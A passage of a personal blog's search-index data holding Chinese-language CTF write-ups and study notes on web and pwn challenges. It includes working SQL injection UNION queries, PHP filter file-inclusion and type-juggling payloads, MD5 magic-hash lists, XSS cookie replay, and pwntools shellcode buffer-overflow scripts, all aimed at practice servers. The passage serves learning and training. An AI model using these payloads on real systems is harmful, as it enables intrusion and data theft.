，抓admin.php网页的包，主要是修改其cookie。抓包结果如下把上边的cookie改为XSS平台得到的cookie（即admin的cookie），在forward，在admin.php界面即可看到flag。","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://hanqd.github.io/tags/web/"},{"name":"XSS","slug":"XSS","permalink":"https://hanqd.github.io/tags/XSS/"}]},{"title":"Web：BasicFileInclude","slug":"php3","date":"2019-04-16T03:21:15.549Z","updated":"2019-04-16T03:22:16.920Z","comments":true,"path":"2019/04/16/php3/","link":"","permalink":"https://hanqd.github.io/2019/04/16/php3/","excerpt":"BasicFileInclude根据题目，可以看出是一道php文件包含漏洞.","text":"BasicFileInclude根据题目，可以看出是一道php文件包含漏洞. php文件包含漏洞 https://www.cnblogs.com/R4v3n/articles/9055514.html https://www.cnblogs.com/vo-ov/p/3745638.html php伪协议：利用文件包含漏洞：https://blog.csdn.net/qq_41289254/article/details/81388343 题目描述 题目分析 根据链接的URL：http://web1.blue-whale.me:23338/?page=flag，知道题目的解题类型：利用 php 流 filter： payload：http://web1.blue-whale.me:23338/?page=php://filter/convert.base64-encode/resource=flag 通过指定末尾的文件，可以读取经 base64 加密后的文件源码，之后再 base64 解码一下就行。base64:aGEgaGE/IHlvdSB3YW50IGZsYWc/IGZsYWcgaXMgaGVyZTw/cGhwDQovLyB0cnkgdG8gcmVhZCB0aGlzIHNvdXJjZSBjb2RlDQovLyRmbGFnID0gJ2ZsYWd7cmVhbGx5X2Jhc2ljX3NraWxsX3dlYl9kb2dfc2hvdWxkX2tub3d9JzsNCj8+LCBidXQgZG9uJ3QgbGV0IHlvdSBzZWUhDQo=解码：ha ha? you want flag? flag is here&lt;?php // try to read this source code //$flag = &#39;flag{really_basic_skill_web_dog_should_know}&#39;; ?&gt;, but don&#39;t let you see! 这里就是在文件中包含了php代码。","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://hanqd.github.io/tags/web/"},{"name":"php","slug":"php","permalink":"https://hanqd.github.io/tags/php/"}]},{"title":"Web：Basic PHP2","slug":"php2","date":"2019-04-15T02:45:31.597Z","updated":"2019-04-15T11:29:45.351Z","comments":true,"path":"2019/04/15/php2/","link":"","permalink":"https://hanqd.github.io/2019/04/15/php2/","excerpt":"Basic PHP2题目描述根据题目要求，现在输入框里输入自己的名字（这里随便输点内容就行），就会进入php页面，php页面内容如下","text":"Basic PHP2题目描述根据题目要求，现在输入框里输入自己的名字（这里随便输点内容就行），就会进入php页面，php页面内容如下123456789101112&lt;?phpif(isset($_GET['content']))&#123; $filename = 'config.php'; $content = $_GET['content']; if(is_int(stripos($content, 'php')) || is_int(stripos($content, '&lt;'))) &#123; echo 'Invalid input'; &#125; else &#123; file_put_contents($filename, $content); echo 'Success'; &#125; &#125; 题目分析 根据php代码看出，通过URL只需要传递一个GET参数content。 条件是is_int(stripos($content, ‘php’)) || is_int(stripos($content, ‘&lt;’))都是否，才能进入else分支，即过滤掉’php’和’&lt;’字符。 stripos函数是查找字符串在另一字符串中第一次出现的位置（不区分大小写）。即在content文件中查找php第一次出现的位置和’&lt;’第一次出现的位置，有则返回位置，没有则返回false。字符串位置从 0 开始，不是从 1 开始。 file_put_contents() 函数把一个字符串写入文件中。把content参数的值写入config.php文件中。 此题关键点在于stripos()函数。绕过stripos()函数，就不用执行if分支。可以使用数组绕过，即让content为数组形式。 部署URL payload：http://123.207.149.64:23360/user/58394a7ca52422f46a6e9e265a295f148592b8b4/index.php?content[]=php 在config.php里得到flag php黑魔法参考博客地址：http://www.10tiao.com/html/664/201702/2650420346/1.html https://ciphersaw.me/2017/12/26/%E3%80%90Bugku%20CTF%E3%80%91%20Web%20%E2%80%94%E2%80%94%20never%20give%20up/","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://hanqd.github.io/tags/web/"},{"name":"php","slug":"php","permalink":"https://hanqd.github.io/tags/php/"}]},{"title":"Web：Basic PHP","slug":"oj php1","date":"2019-04-13T10:12:38.494Z","updated":"2019-04-13T10:14:27.193Z","comments":true,"path":"2019/04/13/oj php1/","link":"","permalink":"https://hanqd.github.io/2019/04/13/oj php1/","excerpt":"Basic PHPWEB入门简单，多做几道WEB题吧。","text":"Basic PHPWEB入门简单，多做几道WEB题吧。 题目描述12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Exercise&lt;/title&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;PHP's basic feature&lt;/h1&gt;&lt;!--好吧其实是老套路了--&gt; &lt;?php require_once('flag.php'); if (isset($_GET['name']) and isset($_GET['password']) &amp;&amp; isset($_GET['test']))&#123; // ========== Stage 1 ========== $test=$_GET['test']; $test=md5($test); if($test=='0') &#123; print 'You passed stage 1.&lt;br /&gt;'; &#125; else&#123; print \"Game over at stage 1.\"; exit(); &#125; // ========== Stage 2 ========== if ($_GET['name'] == $_GET['password'])&#123; print 'Your password can not be your name.'; exit(); &#125; else if (sha1($_GET['name']) === sha1($_GET['password']))&#123; print 'You passed stage 2.&lt;br /&gt;'; print 'Flag: '.$flag; &#125; else&#123; print 'Invalid password'; exit(); &#125; &#125; echo '&lt;hr /&gt;'; show_source(__FILE__); ?&gt; &lt;/body&gt; &lt;/html&gt; 知识准备 很详细的php知识点：https://www.restran.net/2016/09/26/php-security-notes/ php特性：弱类型 题目分析根据题目代码，知道拿到最后的flag，有两个条件。 url的get参数有三个：name,password,test。第一关：参数test是经过MD5加密的，如果经过MD5加密后的test值等于0，则通过第一关。由上边博客中，可知道MD5等于0的有以下值： 123456789101112131415161718192021#0e 开头，后面全是数字的240610708: 0e462097431906509019562988736854QLTHNDT: 0e405967825401955372549139051580QNKCDZO: 0e830400451993494058024219903391PJNPDWY: 0e291529052894702774557631701704NWWKITQ: 0e763082070976038347657360817689NOOPCJF: 0e818888003657176127862245791911MMHUWUV: 0e701732711630150438129209816536MAUXXQC: 0e478478466848439040434801845361IHKFRNS: 0e256160682445802696926137988570GZECLQZ: 0e537612333747236407713628225676GGHMVOE: 0e362766013028313274586933780773GEGHBXL: 0e248776895502908863709684713578EEIZDOI: 0e782601363539291779881938479162DYAXWCA: 0e424759758842488633464374063001DQWRASX: 0e742373665639232907775599582643BRTKUJZ: 0e57640477961333848717747276704ABJIHVY: 0e755264355178451322893275696586aaaXXAYW: 0e540853622400160407992788832284aabg7XSs: 0e087386482136013740957780965295aabC9RqS: 0e041022518165728065344349536299 payload:http://123.207.149.64:23331/feature/?name=1&amp;password=2&amp;test=240610708 第一关通过。 第二关要求name和password是弱类型不相等（==），并且还要求sha1($_GET[‘name’]) === sha1($_GET[‘password’]，（===）是强相等，数据类型一样，数值一样。 == 是弱类型的比较 === 比较符则可以避免这种隐式转换，除了检查值还检查类型。 通关条件：name不等于password &amp;&amp; sha1(name)===sha1(password)md5 和 sha1 无法处理数组，但是 php 没有抛出异常，直接返回 fasle，根据弱类型特点：NULL == false == 0，即让name和password以数组的形式做为GET参数，那么PHP处理URL时，就会把参数当做数组处理，从而绕过sha1函数。payload：http://123.207.149.64:23331/feature/?name[]=1&amp;password[]=2&amp;test=240610708 得到flag。","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://hanqd.github.io/tags/web/"}]},{"title":"web oj:Basic SQL","slug":"Sql","date":"2019-04-13T08:32:55.543Z","updated":"2019-04-13T08:34:03.500Z","comments":true,"path":"2019/04/13/Sql/","link":"","permalink":"https://hanqd.github.io/2019/04/13/Sql/","excerpt":"Basic SQL知识准备大致浏览了SQL注入的知识，大致题型以及解题步骤，附上博客地址，供参考。","text":"Basic SQL知识准备大致浏览了SQL注入的知识，大致题型以及解题步骤，附上博客地址，供参考。 了解SQL注入的理论知识 https://ctf-wiki.github.io/ctf-wiki/web/sqli/ +https://www.jb51.net/article/93434.htm 基本注入步骤（我觉得易理解的） https://cloud.tencent.com/developer/news/155446step1：寻找注入点step2：判断列数step3：报显位step4：联合查询数据库名、表名、字段名以及你需要的信息 Sql常见题型整理 https://blog.csdn.net/huanghelouzi/article/details/82999684 手工注入示例：https://www.jb51.net/article/93442.htm（本题用这种方法） 题目描述打开题目地址，界面如上，有一个搜索输入框，下边是News内容。根据题目是一个SQL注入题。 题目分析 找注入点在输入框中输入’，回车，页面出错，说明此处的单引号确实被服务器解析了。再加一个’，输入’’，没出错，说明此处的单引号被我们成功闭合了。可以说明此处存在着sql注入点。 判断列数用到order by，即排序。order by 1，就是按第一个字段排序。一开始我们会猜一个大概的数字，比如order by 5。如果报错说明不能按第5个字段进行排序，也就是说没有第5个字段。之后我们折半来猜，所以第二次猜3。order by 3 有回显说明有第三列。再试4，发现4报错。于是可以确认该表只有3个字段。 爆显位判断页面中显示的字段输入 -1&#39; union select 1,2,3 #结果是2和3字段可以显示我们在输入的内容 联合查询数据库名、表名、字段名以及所需要的信息（1）查询数据库名（输入固定）输入-1&#39; union select 1,2,group_concat(schema_name) from information_schema.schemata #有两个数据库，在第二个字段中显示的。（2）表名输入1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#有f1agfl4gher3,news两个表，这里不截图了。（3）表中的字段名（列）1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;表名&#39; #输入1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;f1agfl4gher3&#39; #f1agfl4gher3表有id,h3r31sfl4g两个字段1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;news&#39;#news有id,title,content三个字段（4）查看字段信息1&#39; union select 1,字段名 from 表名 #看到f1agfl4gher3表很像有flag的样子，于是输入1&#39; union select 1,id,h3r31sfl4g from f1agfl4gher3 #得到flag！","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://hanqd.github.io/tags/web/"}]},{"title":"Web calculator+Rapid Typing","slug":"oj Web","date":"2019-04-12T09:07:11.620Z","updated":"2019-04-12T09:20:59.310Z","comments":true,"path":"2019/04/12/oj Web/","link":"","permalink":"https://hanqd.github.io/2019/04/12/oj Web/","excerpt":"calculator再回顾学习今天看了有解出这个题的博客，发现他写的脚本简单，且易理解，向他学习！还有意识到自己Python知识功底太差，以后要多加学习。","text":"calculator再回顾学习今天看了有解出这个题的博客，发现他写的脚本简单，且易理解，向他学习！还有意识到自己Python知识功底太差，以后要多加学习。 在他的解题中，用到了字符串切分函数，具体找到一个博客仅供参考https://blog.csdn.net/qq_24407657/article/details/80265217 ，这个举的例子一看就懂怎么用。 Python的格式化输出 https://www.cnblogs.com/linguansheng/p/10184102.html 还有在这里他用的cookie进行用户身份认证，我用的是session，作用是一样的。 我的代码中用得re.compile(r’\\d+’)，在这里做以下解释（以免后来忘记什么意思，可查阅）：r表示不转义，即不把\\d当做一个字符进行解析。\\d是匹配数字字符[0-9]，+匹配一个或多个，’\\d+’是匹配一个或多个数字字符。然后用re.findall（）函数返回一个只有数字字符的列表。 从字符串中提取数字 https://blog.csdn.net/u010412858/article/details/83062200 脚本代码123456789101112131415161718192021222324252627282930import requestsfrom bs4 import BeautifulSoupimport res = requests.Session()t = s.get('http://123.207.149.64:23331/calculator/')#print(t.text)#爬取网页里的&lt;span&gt;标签里的内容soup = BeautifulSoup(t.text,'lxml')a = soup.find_all(id=\"exp\")#打印出来，是一个只有一个元素的列表print(a)#把列表里的元素转为字符串equ = str(a)#对字符串里的纯数字进行提取pattern = re.compile(r'\\d+')num = re.findall(pattern,equ)#打印一下，看到数字列表print(num)j = 0dic=[0,0,0,0]for i in rangenum: dic[j] = int(i) j=j+1result = dic[0]+dic[1]*dic[2]-dic[3]canshu = &#123;'answer':str(result)&#125;r =s.get('http://123.207.149.64:23331/calculator/', params=canshu)print(r.text) 运行结果下面是运行脚本的结果 123456789101112131415161718192021222324252627[&lt;span id=\"exp\"&gt;530076 + 102875 * 60812 - 45970 = &lt;/span&gt;]['530076', '102875', '60812', '45970']&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Calculator&lt;/title&gt; &lt;style type=\"text/css\"&gt; .line_input&#123; border-width: 1px; border-bottom: solid; border-top: none; border-left: none; border-right: none; border-width: 1px; text-align: center; outline: none; margin: 0 1em; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;center&gt;&lt;h1&gt;Yet Another Calculator&lt;/h1&gt;flag&#123;yes_you_are_calculat0r&#125;&lt;br /&gt;Time elapsed: 0.017600059509277 s&lt;br /&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt; Rapid Typing题目描述 题目分析 在页面上随便输入几个数字，得到提交答案的URL以及参数名称 审查代码，发现要计算的数在img标签中，而且发现里边有Base64 提交结果用GET方法，参数code在URL中，最后以text形式查看。 第一次直接把提取出的img标签中的列表转换为字符串，然后解码，错误，发现要把base64后面的一长串字符串（这才是真正的base64编码后的内容）提取然后解码。错误代码：123456soup = BeautifulSoup(htm.text,'lxml')a=soup.find_all('img')print(a)equ = str(a)decod = base64.b64decode(equ)print(decod) 修改后代码1234567soup = BeautifulSoup(htm.text,'lxml')#用逗号分隔字符串，取取第二块字符串（下标从0开始）a = soup.find('img').get('src').split(',')[1]print(a)equ = str(a)decod = base64.b64decode(equ)print(decod) 输出结果如下 解码后发现是一个svg标签，复制整个标签代码到在线编辑器中，发现就是题目中的图片！百度后知道SVG是可缩放矢量图形（Scalable Vector Graphics）是基于可扩展标记语言（XML），用于描述二维矢量图形的一种图形格式。与传统的图像格式不同的是，SVG采用文本来描述矢量化的图形，这使得SVG图像文件可以像HTML网页一样有着很好的可读性。再看得到的svg标签，发现了图片中的字母和数字在text标签中,是二维的。 把text标签中的内容提取出来，并按x的大小排序后，取出text标签中的值，用一个字符串连接，打印一下，可以看到需要提交的字符串。排序参考：https://www.cnblogs.com/whaben/p/6495702.html取text标签中的内容，即需要输出的字符，可用bs4的string属性，具体可见：https://www.cnblogs.com/gl1573/p/9958716.html 脚本123456789101112131415161718192021222324252627282930313233343536import requestsfrom bs4 import BeautifulSoupimport reimport base64session = requests.Session()htm = session.get('http://123.207.149.64:23331/captcha/')#print(htm.text)#提取img标签内容（仅提取base64后面的内容，即逗号后边第一个）soup = BeautifulSoup(htm.text,'lxml')a = soup.find('img').get('src').split(',')[1]#print(a)stra = str(a)#base64解码decod = base64.b64decode(stra)#print(decod)#提取解码后svg中的所有text标签soup1 = BeautifulSoup(decod,'lxml')tex = soup1.find_all(\"text\")#print(tex)#对x进行排序（text标签中）sortx = sorted(tex,key=lambda x:int(x.get('x')))#print (sortx)#用string属性提取text标签中的字符，并用string1进行连接string1=''for zimu in sortx: string1 = string1+zimu.stringprint(string1)#提交结果result1 = &#123;'code': string1&#125;r =session.get(\"http://123.207.149.64:23331/captcha/\", params=result1)print(r.text) 提交结果12345678910qeJYoNRiXYUpXKawgjysh5NHY3BxaMZeeMPZa6Lr&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Rapid Typing&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Rapid Typing&lt;/h1&gt;flag&#123;svg_C4P7cHa_n0t_$ecUr3&#125;&lt;br /&gt;Time elapsed: 0.1487181186676 s&lt;br /&gt;&lt;/body&gt;&lt;/html&gt;","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://hanqd.github.io/tags/web/"}]},{"title":"Web学习+oj Web","slug":"20190411","date":"2019-04-11T14:38:16.360Z","updated":"2019-04-11T14:44:50.552Z","comments":true,"path":"2019/04/11/20190411/","link":"","permalink":"https://hanqd.github.io/2019/04/11/20190411/","excerpt":"通过视频学习了WEB，下面是做的笔记，供以后查阅,一个字一个字码的，omg。","text":"通过视频学习了WEB，下面是做的笔记，供以后查阅,一个字一个字码的，omg。 HTTP协议HTTP简介 HTTP（超文本传输协议） HTTP设计用来将超文本标记语言（HTML）文档从Web服务器传送到Web浏览器 HTTP是一个请求和回应协议：客户机发送请求，服务器对请求给出回应 HTTP（应用层协议）使用可靠的TCP（传输层协议）连接，默认TCP端口是80（HTTP不安全） 承载于TLS或SSL协议层之上，默认端口为443（HTTPS安全） HTTP非持久连接 浏览器首先初始化与运行http服务器主机的TCP连接，使用URL指定端口 浏览器通过与TCP连接相关联的本地套接字发出一个HTTP请求信息 服务器接收到请求后，解析请求并处理请求，然后通过一个套接字发出响应信息 服务器通知TCP需要关闭连接（在浏览器收到响应消息后才会真正终止连接） 浏览器收到响应消息，TCP终止连接这个就是平时访问一个静态页面，HTTP所做的工作，我们输入一个网址，期间有一个响应时间，一旦我们看到了我们访问的页面，服务器就会关闭TCP连接。 HTTP持久连接 持久连接没有关闭连接这一步，服务器响应后会继续让TCP连接保持打开状态当我们请求一个大的文件或者观看视频的时候，服务器会让TCP连接打开，持续输出数据。（当看视频时，下边的缓存条就是说明TCP持续保持连接） HTTP特点 支持客户/服务器模式（也就是浏览器/服务器模式） 简单快速客户向服务器请求服务时，只需传送请求方法和路径（URL），不需要等待很长的协议解析时间。 灵活HTTP允许传输任意类型的数据对象。正在传输的类型由Content-Type加以标记后，就可以被浏览器和服务器识别。 无连接每次连接只处理一个请求。服务器处理完客户的请求，并收到客户的应答后，即断开连接。 HTTP协议是无状态协议无状态是指协议对于事务处理没有记忆能力。 URL：统一资源定位符 统一资源定位符是对可以从互联网上得到的资源的位置和访问方法的一种简洁表示，是互联网上标准资源地址。互联网上的每个文件都有一个唯一的URL，它包含的信息指出文件的位置以及浏览器应该怎么处理它。 URL标准格式：schema://[user:password@]domain:port/path?query_string#fragments字段解释： schema：请求协议格式，例如http、php、JavaScript user:password@：用户访问服务器时，输入用户名和密码，通过http协议进行身份验证，现在都不这么做了，并不是每个网站都需要实名认证的，都是匿名访问。 domain：域名，服务器的标识，如百度，还有直接是ip地址标识，都是一样的。（平常我们输入网址时，主要是输这一部分） port：端口（输入时一般省略，默认80），但是在做渗透时，可能要用多个端口，为防止端口重用，要输入端口号。 path：路径，即页面的路径 query_string：web传输的参数，http中的get参数，例如搜索关键词时，服务器就是通过URL后的这个参数定位关键词的。 fragments：标记符，可以通过设置，让页面定位在不同的地方，例如top,让页面在顶部 注意：URL中允许出现的字符是有限制的，URL的path开始允许直接出现A-Z，a-z,0-9以及半角连接（-，半角减号）、下划线（_）、点号（.）、波浪号（~）。其他字符均会被进行百分号编码。 抓包分析HTTP报文 HTTP的一个会话，由Request和response组成（请求包和响应包） HTTP请求（Requests）由请求行、消息报头、请求正文三部分组成请求行：请求方法、URL、协议/版本(一般用http1.0版本)消息报头/请求头，这是一个扩充选项，里边的内容可能不全，标识用户的一些请求状态请求正文，一般包含一些参数或者是上传给服务器的文件。不一定不存在 HTTP响应（Responses）也包含三个部分：状态行、消息报头、响应正文状态行：协议状态代码描述消息报头：描述服务器的一些信息响应正文：一定会有 设置代理 知道HTTP协议分为两部分：请求和回应 而平时浏览网页，请求报文是经过浏览器包装好的，不通过工具直接访问只能够控制很少的部分 要想真正的认为控制与服务器的交互，只能通过代理抓包的方法 代理：作为客户端和服务器的中间者，在利用http协议交互时，所有请求和回应都不会直接发送给目标，而是由代理接受和转发 浏览器设置代理 进入浏览器的“选项” 配置网络代理“设置”，手动配置代理（一般不用代理服务器，浏览器直接和服务器对话） 通常在本机进行抓包（代理在本机上） 设置ip地址为127.0.0.1（本机寻回测试的地址）端口为任意空闲端口并记录（代理模式为http代理）怎么查看端口是否空闲？？（一般用8080端口）在cmd里输入 netstat -an命令，即可查看用了的端口 burpsuite代理设置在浏览器中设置好了代理（就是127.0.0.1），那么还得告诉这个中间人，让他给浏览器和服务器传话，接下来对这个代理进行设置。（用burpsuite工具） 进入burpsuite的proxy选项 点击Option设置栏 选中需要设置的代理地址点击edit进行配置 将IP和端口设置为与浏览器中相同的选项 当设置完代理后，界面上IP地址前有一个小框，如果端口空闲，可以打上对号，如果发现打不上对号，说明当前使用的端口被占，只要换一个端口就行，注意这里改了，浏览器那里也得改。 抓包实践 切换到proxy功能中的Intercept窗口 将intercept选项设置为on开启状态 浏览器访问任意网页，burp即可抓取到请求报文请求回应HTTP请求报文如上图所示第一行GET，那是请求行下边红框里的全是消息报头这里没有请求正文，因为这里只访问了一个静态页面HTTP请求方法 GET GET方法用于获取请求页面的指定形式 （通过URL） POST POST可以向服务器传输一些加密信息，也可以传输文件，POST方法与GET方法相似，但是最大的区别在于GET方法没有请求内容，而POST是有请求正文的，且GET请求会将发送的数据显示在浏览器端，而POST请求不会 HEAD HEAD方法除了服务器不能在响应里返回消息正文主体，其他的与GET方法相同 PUT PUT相当于往服务器上传资源。PUT方法用于请求服务器把请求实体存储在请求资源下，如果请求资源已经存在服务器中，将会用此请求中的数据替换原先的数据，作为指定资源的最新修改版 以下HTTP方法可能会对服务器造成损害 DELETE 与PUT方法相反，DELETE方法用于请求资源服务器删除指定的资源 TRACE TRACE方法一般用于激发一个远程应用层的请求消息回路。回显服务器收到得到请求。可用于监测除了自己以外，还有没有代理截取了自己的返回包 CONNECT 为了用于能动态的切换到隧道的代理 OPTIONS OPTIONS方法用于请求获取URL标识的资源在请求/响应的通信过程中可以使用的功能选项 HTTP请求首部 Host：主要用于指定被请求资源的Internet主机和端口号 User-Agent：向服务器端传递客户端操作系统、浏览器、和其他的属性 Referer:包含一个URL，代表当前URL上的一个URL，比如点击了百度的页面，再从百度页面中进入下一个页面，就又referer，第一个页面没有referer Cookie：是一段文本，通常来表示请求者身份 Range：Range可以请求实体部分内容，不下载整个文件内容，多线程下载一定会用到此请求头 x-forward-for：即XFF头，代表请求端的IP，也可以是多个，中间用逗号隔开 Accept:用于指定客户端接收哪些MIME类型的信息 Accept-Charset：用于指定客户端接收的字符集 下面是用POST发起请求时，才会有的请求正文的信息头，会标识我们要上传的文件，会用到以下几个字段：（信息：就是实体内部的属性，包括实体信息类型、长度、压缩方法，最后一次修改时间等） Content-Type：用于向接收方指示实体的介质类型（上传的文件类型） Content-Encoding：被用作媒体类型的修饰符，表示了已经被用到实体正文的附加内容编码，想要获得content-type报头域中所引用的媒体类型，必须采用相应的解码机制。（标识加密编码的模式） Content-Length：用于指明实体正文的长度，以字节方式存储的十进制数字来表示 Last-Modified：用于指示资源的最后修改时间和日期 HTTP响应报文 状态行：由三部分组成：（如上图红框所示）HTTP-Version：表示服务器HTTP协议的版本Status-Code ：表示服务器发回的响应状态代码Reason-Phrase：表示状态代码的文本描述状态代码由三位数字组成，第一个数字定义了响应的类别，且有五种可能取值： 1xx：指示信息–表示请求已接收，继续处理，范围是100~101 2xx：成功–表示请求已被成功接收、理解、接受，范围是200~206 3xx：重定向–要完成请求必须进行更进一步操作，范围是300~305 4xx：客户端错误–请求有语法错误或请求无法实现，范围是400~415 5xx：服务器端错误–服务器未能实现合法的请求，范围是500~505 HTTP常见响应状态码 响应报头 响应正文就是服务器返回的资源的内容 HTTP响应首部响应头：是服务器根据客户端发送的请求返回的内容 Sever：服务器所使用的Web服务器的名称 Set-Cookie：向客户端设置Cookie Last-Modified:服务器通过这个头信息告诉浏览器，资源的最后修改时间 Location：告诉浏览器去访问哪个页面，浏览器接收到这个请求后会立刻访问Location头所指向的页面 Refresh：服务器通过Refresh头告诉浏览器定时刷新浏览器 HTTP安全机制HTTP安全问题HTTP没有考虑到信息的加密和验证问题，面临着数据明文传送和缺乏对消息完整性的验证这两个问题。HTTP协议在数据传输过程中，只要攻击者能够控制到受害者的网络，便可以轻易的嗅探、修改HTTP传输的内容。HTTP协议在传输客户端请求和服务端响应时，仅仅在报文头部包含了传输数据长度，没有任何校验数据完整性的机制。 HTTP安全协议HTTPS协议，通过在TCP层与HTTP层增加一个SSL（安全套接字）来增强数据传输时的安全性。使用HTTPS时，数据的传输的加解密均由SSL进行，与上层HTTP无关。 HTTP与HTTPS的区别HTTPS是在HTTP协议的基础上，HTTP请求与响应都是以相同的方式进行工作，主要区别如下： HTTP是超文本传输协议，信息明文传输。HTTPS是由安全性的SSL加密传输协议 HTTP与HTTPS采用完全不同的连接方式，HTTP是80端口，HTTPS是443端口 HTTPS协议需要到CA申请证书，而HTTP不需要 HTTP连接相对简单，是无状态的，而HTTPS协议是由SSL+HTTP协议构建的可进行加密传输，身份认证的网络协议。Cookie与session会话（session）跟踪是Web程序中常用的技术，用来跟踪用户的整个会话。常用的会话跟踪技术是Cookie与Session。 Cookie通过在客户端记录信息确定用户身份（会话信息存储在客户端）Session通过在服务器端记录信息确定用户身份（会话信息存储在服务器端）Session和Cookie的作用都是为了保持访问用户与后端服务器的交互状态。 Web calculator由于之前的request库导入不成功，一直出错，今天把pycharm重装，把电脑上多个版本的Python卸载之后，可以正常使用requests库了。于是接着把之前做的calculator题解完。爬取页面数据可以用requests 与 beautiful soup，具体例子https://www.jianshu.com/p/9c266216957b。，很详细，适合新手。然后用正则表达式来匹配数字，创建一个列表（相当于C中的数组），把需要计算的数字存到列表中，计算结果。根据提交ip地址，提交结果，打印页面，即得到flag。下面是我的解题脚本12345678910111213141516171819202122import requestsfrom bs4 import BeautifulSoupimport res = requests.Session()t = s.get('http://123.207.149.64:23331/calculator/')print(t.text)soup = BeautifulSoup(t.text,'lxml')a = soup.find_all(id=\"exp\")equ = a[0].stringpattern = re.compile(r'\\d+')num = re.findall(pattern,equ)print(num)j = 0dic=[0,0,0,0]for i in num: dic[j] = int(i) j=j+1result = dic[0]+dic[1]*dic[2]-dic[3]print(result)canshu = &#123;'answer':str(result)&#125;r =s.get('http://123.207.149.64:23331/calculator/', params=canshu)print(r.text)","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://hanqd.github.io/tags/web/"}]},{"title":"pwn题目初尝试","slug":"oj pwn","date":"2019-04-10T14:39:27.968Z","updated":"2019-04-10T14:40:53.915Z","comments":true,"path":"2019/04/10/oj pwn/","link":"","permalink":"https://hanqd.github.io/2019/04/10/oj pwn/","excerpt":"oj pwn-bof搭建好环境，也看了很多关于pwn的博客，就开始练练手吧，毕竟理论和实际操作还是有差别的。","text":"oj pwn-bof搭建好环境，也看了很多关于pwn的博客，就开始练练手吧，毕竟理论和实际操作还是有差别的。 知识准备二进制保护检测工具——checksec。里边的参数解释： Arch，该项位程序的位数，显示位32位程序。 RELRO，RELRO会有Partial RELRO和FULL RELRO，如果开启了FULL RELRO，那么我们将无法修改got表，关于got表后面的文章遇到了再讲解。 Stack，栈中是否开启了Canary found，如果该项保护被打开那么我们将无法直接覆盖EIP让程序任意跳转，因为在跳转后将会进行cookie校验，该项保护是可以绕过的，遇到的时候将详细分析。 NX，该项表示堆栈是否可执行，如果开启了该项保护，那么我们的shellcode将不能被执行。 PIE，该项表示地址随机化保护，如果开启了该项那么程序每次运行的地址都会变化，如果未开启那么No PIE（0x8048000）括号内的代表程序基址。 查看rof文件信息 ：file 文件名是32位的，用IDA 32位的把文件打开 查看保护机制没开任何保护，可以进行常规操作啦。 运行程序把文件bof拖到Ubuntu里，在终端用命令行运行（./pwn），输入很多a，出现如下错误，说明产生了溢出。 分析代码 找offset,用gdb进行调试，查看刚好输入多少位才能覆盖返回地址。 返回地址这需要构造什么内容，如果没有保护直接写shellcode，拿到shell,如果在程序中有system，则在IDA中按Alt+T查找有没有“/bin/sh”字符串，如果有，则直接找到其地址，即可构造内容，没有则需要自己写shellcode。 我在做这道题时，进行第一步就卡住了，用gdb运行程序出错，如下于是手动算位数，需要’a’*0x1c+’a’*4,需要32位才能刚好覆盖返回地址（这里根据在IDA看到的buf空间算出来的位数可能不对，这里先试一下。）有了需要覆盖的内容位数，在来找shell的返回地址，看到bof中有system函数，但是没有“/bin/sh”字符串，需要构造shellcode. 脚本123456789from pwn import *#r=remote('pwn1.blue-whale.me',9990)r=process('./pwn')elf=ELF('./pwn')shellcode=asm(shellcraft.sh())address = 0x080483F0payload = 'a'*(32-len(shellcode))+ p32(address)+shellcoder.send(payload)r.interactive() 但是攻击失败。。。。。 shellcode前面步骤同上，在此略去。 进入gdb调试 首先用cyclic命令产生长度很长的字符串，这里长度是200，可自己设置。 进入gdb调试 把上面产生的字符串输入进去 出现寄存器的内容和PC地址 查看覆盖长度脚本12345678from pwn import *r = remote (\"pwn1.blue-whale.me\",9992)shellcode=asm(shellcraft.sh())text = r.recvline()[17: -2]buf_addr=int(text,16)payload=shellcode+'a'*(32-len(shellcode))+p32(buf_addr)r.send(payload)r.interactive() 总结我觉得这个题出错点有二：一是可能覆盖位数算错了二是shellcode注入的地址有误做pwn题还是得多练习，多找思路，多借助工具，可能事半功倍。争取明天做出来！ 今日所做边做题边看了很多pwn的博客，还有pwn的writeup，做了第一道bof和shellcode那道，shellcode题用了题目给出的网址和端口号，可能服务器被墙了，导致连接端口失败。","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://hanqd.github.io/tags/pwn/"}]},{"title":"pwn环境搭建（Ubuntu下）","slug":"pwn环境搭建","date":"2019-04-09T13:53:36.143Z","updated":"2019-04-09T13:54:34.482Z","comments":true,"path":"2019/04/09/pwn环境搭建/","link":"","permalink":"https://hanqd.github.io/2019/04/09/pwn环境搭建/","excerpt":"pwn环境搭建前言因为需要pwn做题环境，之前也搭建过，不过没有成功，原因是Ubuntu系统源一直更新不成功，所以导致之后的安装全部失败，今天抱着又失败的心情来安装，竟然成功了！！！因为找到了正确的阿里源！！感谢大佬！http://www.cnblogs.com/dtiove/p/5917263.html","text":"pwn环境搭建前言因为需要pwn做题环境，之前也搭建过，不过没有成功，原因是Ubuntu系统源一直更新不成功，所以导致之后的安装全部失败，今天抱着又失败的心情来安装，竟然成功了！！！因为找到了正确的阿里源！！感谢大佬！http://www.cnblogs.com/dtiove/p/5917263.html更换源：sudo gedit sources.list更新源以下是根据网上各种安装博客，搭建的pwn做题环境,在这里记录一下： 安装所需 Ubuntu16.4 Python pip libssl-dev libffi-dev 安装命令sudo apt-get install libffi-devsudo apt-get install 